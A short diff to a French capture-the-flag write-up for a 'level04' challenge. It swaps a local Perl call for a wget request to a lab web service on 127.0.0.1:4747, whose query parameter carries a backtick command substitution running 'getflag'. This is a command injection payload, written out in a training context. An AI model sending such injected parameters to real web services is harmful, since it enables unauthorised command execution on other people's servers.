@@ -24,6 +24,6 @@ wget -O - localhost:4747
 nous indique que c'est bien le cas,
 il suffit donc de reproduire notre eploit via wget:
 
-./level04.pl x=\`getflag\`
+wget -O - 127.0.0.1:4747/?x=\`getflag\`
 
 Nous renvoie bien le flag
